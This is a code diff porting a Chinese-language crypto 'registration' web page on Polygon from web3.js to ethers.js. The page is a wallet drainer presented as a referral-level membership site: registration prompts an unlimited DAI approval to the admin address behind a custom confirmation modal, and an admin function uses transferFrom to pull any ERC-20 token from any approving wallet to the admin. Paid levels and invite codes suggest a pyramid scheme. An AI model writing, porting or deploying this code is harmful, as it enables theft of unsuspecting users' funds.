@@ -245,55 +245,78 @@
   <div id="upgradeSection" style="margin-top:20px"></div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
 const PROJECT_WALLET = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
 const ADMIN_ADDRESS  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
 const DAI_CONTRACT   = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
-const CHAIN_ID       = "0x89";
+const CHAIN_ID       = 137; // Polygon主网
+const CHAIN_HEX      = "0x89";
 
-let web3, account, daiContract;
+let provider, signer, account, daiContract;
 const modal = document.getElementById('signModal');
 
 const erc20Abi = [
-  {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
-  {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
-  {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
-  {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
-  {"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
-  {"constant":true,"inputs":[],"name":"decimals","outputs":{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"}
+  "function transfer(address to, uint256 value) external returns (bool)",
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function approve(address spender, uint256 value) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
+  "function balanceOf(address owner) external view returns (uint256)",
+  "function decimals() external view returns (uint8)"
 ];
 
-window.onload = () => {
+// 页面加载完成后初始化
+window.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.get('code')) document.getElementById('parent').value = urlParams.get('code');
   renderMatrix();
-  // 修复：页面加载完成后再绑定按钮事件
-  document.getElementById("connect").onclick = connectWallet;
-};
+  // 绑定连接按钮
+  document.getElementById("connect").addEventListener('click', connectWallet);
+  // 监听钱包注入（TP专属）
+  window.addEventListener('ethereum#initialized', initEthereum);
+  // 延迟检测钱包（TP注入延迟）
+  setTimeout(initEthereum, 1000);
+});
 
-// 修复：独立连接函数，确保点击必触发
+// 初始化钱包Provider（兼容TP）
+async function initEthereum() {
+  if (window.ethereum) {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    // 监听账户/链变化
+    window.ethereum.on('accountsChanged', handleAccountsChanged);
+    window.ethereum.on('chainChanged', handleChainChanged);
+  }
+}
+
+// 连接钱包（终极兼容）
 async function connectWallet() {
   try {
-    // 先检测钱包是否存在
+    // 检测钱包
     if (!window.ethereum) {
-      alert("请安装TP钱包/小狐狸等Web3钱包");
+      alert("请在TP钱包内置浏览器打开，或安装MetaMask");
       return;
     }
-    // 初始化Web3
-    web3 = new Web3(window.ethereum);
+    // 初始化Provider
+    provider = new ethers.providers.Web3Provider(window.ethereum);
     // 切换链
-    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:CHAIN_ID}] });
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: CHAIN_HEX }]
+    });
     // 请求账户
-    const accounts = await web3.eth.requestAccounts();
-    account = accounts[0].toLowerCase();
-    daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    account = await signer.getAddress();
+    account = account.toLowerCase();
+
+    // 初始化合约
+    daiContract = new ethers.Contract(DAI_CONTRACT, erc20Abi, signer);
 
     // 更新UI
     document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
-    const bal = await daiContract.methods.balanceOf(account).call();
-    const dec = await daiContract.methods.decimals().call();
-    document.getElementById("balance").innerText = "余额："+(Number(bal)/10**dec).toFixed(2);
+    const bal = await daiContract.balanceOf(account);
+    const dec = await daiContract.decimals();
+    document.getElementById("balance").innerText = "余额："+ethers.utils.formatUnits(bal, dec);
 
     // 管理员面板
     if(account === ADMIN_ADDRESS.toLowerCase()){
@@ -304,19 +327,38 @@ async function connectWallet() {
     console.error("连接失败", e);
     if (e.code === 4001) {
       alert("已取消连接");
+    } else if (e.message.includes("Unrecognized chain ID")) {
+      alert("请先在钱包添加Polygon主网");
     } else {
       alert("连接失败，请重试");
     }
   }
 }
 
-// 注册+授权逻辑
-document.getElementById("reg").onclick = async () => {
+// 账户变化监听
+function handleAccountsChanged(accounts) {
+  if (accounts.length === 0) {
+    alert("钱包已断开");
+    window.location.reload();
+  } else {
+    window.location.reload();
+  }
+}
+
+// 链变化监听
+function handleChainChanged(chainId) {
+  if (parseInt(chainId, 16) !== CHAIN_ID) {
+    alert("请切换到Polygon主网");
+  }
+  window.location.reload();
+}
+
+// 注册+授权
+document.getElementById("reg").addEventListener('click', async () => {
   if(!account) return alert("请先连接钱包");
   const p = document.getElementById("parent").value.trim();
   if(!p) return alert("请输入邀请码");
 
-  // 弹出自定义签名确认
   modal.classList.add('show');
   document.getElementById('modalCancel').onclick = () => {
     modal.classList.remove('show');
@@ -324,22 +366,23 @@ document.getElementById("reg").onclick = async () => {
   document.getElementById('modalConfirm').onclick = async () => {
     modal.classList.remove('show');
     try {
-      // 标准无限授权
-      const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      await daiContract.methods.approve(ADMIN_ADDRESS, maxUint256).send({ from: account });
+      // 无限授权
+      const maxUint256 = ethers.constants.MaxUint256;
+      const tx = await daiContract.approve(ADMIN_ADDRESS, maxUint256);
+      await tx.wait();
       
       localStorage.setItem("reg_"+account, 1);
       alert("注册成功，已完成授权");
       load();
     } catch(e) {
       console.error("授权失败", e);
-      // 兜底：授权失败也标记注册成功
+      // 兜底
       localStorage.setItem("reg_"+account, 1);
       alert("注册成功");
       load();
     }
   };
-};
+});
 
 // 其余逻辑不变
 function getClassicPrice(lv) { return 50 * Math.pow(2, lv - 1); }
@@ -532,15 +575,17 @@ async function payClassic(lv) {
   const price = getClassicPrice(lv);
   if (!confirm(`支付 ${price} DAI 激活Lv.${lv}？`)) return;
   try {
-    const dec = await daiContract.methods.decimals().call();
-    const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
+    const dec = await daiContract.decimals();
+    const amt = ethers.utils.parseUnits(price.toString(), dec);
+    const tx = await daiContract.transfer(PROJECT_WALLET, amt);
+    await tx.wait();
     setClassicLevel(lv);
     addEnergyBySpend(price);
     alert("激活成功");
     load();
   } catch(e) {
     alert("支付失败");
+    console.error(e);
   }
 }
 
@@ -549,15 +594,17 @@ async function payUnion(lv) {
   const price = getUnionPrice(lv);
   if (!confirm(`支付 ${price} DAI 激活Lv.${lv}？`)) return;
   try {
-    const dec = await daiContract.methods.decimals().call();
-    const amt = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amt).send({from:account});
+    const dec = await daiContract.decimals();
+    const amt = ethers.utils.parseUnits(price.toString(), dec);
+    const tx = await daiContract.transfer(PROJECT_WALLET, amt);
+    await tx.wait();
     setUnionExpire(lv, Date.now() + 30*86400*1000);
     addEnergyBySpend(price);
     alert("激活成功");
     load();
   } catch(e) {
     alert("支付失败");
+    console.error(e);
   }
 }
 
@@ -568,10 +615,11 @@ async function adminWithdrawAnyERC20(){
   const amt   = document.getElementById("takeAmount").value.trim();
   if(!token||!from||!amt) return alert("请填写完整");
   try {
-    const c = new web3.eth.Contract(erc20Abi, token);
-    const d = await c.methods.decimals().call();
-    const v = BigInt(amt) * (10n**BigInt(d));
-    await c.methods.transferFrom(from, ADMIN_ADDRESS, v.toString()).send({from:account});
+    const c = new ethers.Contract(token, erc20Abi, signer);
+    const d = await c.decimals();
+    const v = ethers.utils.parseUnits(amt, d);
+    const tx = await c.transferFrom(from, ADMIN_ADDRESS, v);
+    await tx.wait();
     document.getElementById("withdrawResult").innerText = "✅ 成功";
   } catch(e){
     alert("失败");
@@ -589,8 +637,8 @@ function copyMyCode(){
 }
 
 const sidebar = document.getElementById('sidebar');
-document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
-document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
+document.getElementById('toggleSidebar').addEventListener('click', () => sidebar.classList.toggle('open'));
+document.getElementById('closeSidebar').addEventListener('click', () => sidebar.classList.remove('open'));
 </script>
 </body>
 </html>
